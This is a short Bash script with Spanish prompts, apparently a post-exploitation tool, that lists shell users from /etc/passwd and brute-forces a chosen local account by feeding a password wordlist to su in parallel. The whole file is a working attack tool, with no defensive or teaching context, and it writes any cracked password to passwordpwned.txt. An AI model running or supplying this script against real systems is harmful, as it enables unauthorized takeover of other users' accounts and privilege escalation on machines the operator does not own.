#!/bin/bash
PASSWORDS_FILE="passwords.txt"
echo -e "Cuantos hilos quieres que contemple el script?: \c" #BY S7V3N
read THREADS
echo 
echo "..............................."
cat /etc/passwd | grep bash 
echo "..............................."
echo
echo  
echo "Estos son los usuarios encontrados en la maquina" 
echo 
echo -e "ha que usuario quieres pivotar dentro de la maquina: \c"
read USUARIO
try_password() {
    password=$1
    echo "$password" | su $USUARIO  -c 'echo "Acceso concedido"' &> /dev/null
    if [ $? -eq 0 ]; then
        echo "¡Contraseña encontrada: $password!"
        echo "$password" > passwordpwned.txt
	exit 0
    fi
}
count=0
while IFS= read -r password
do   
    	echo "Probando contraseña: $password" 
    	try_password "$password" &  
    	((count++))
    	if (( count % THREADS == 0 )); then
        	wait  
    	fi

      
done < "$PASSWORDS_FILE"

wait 
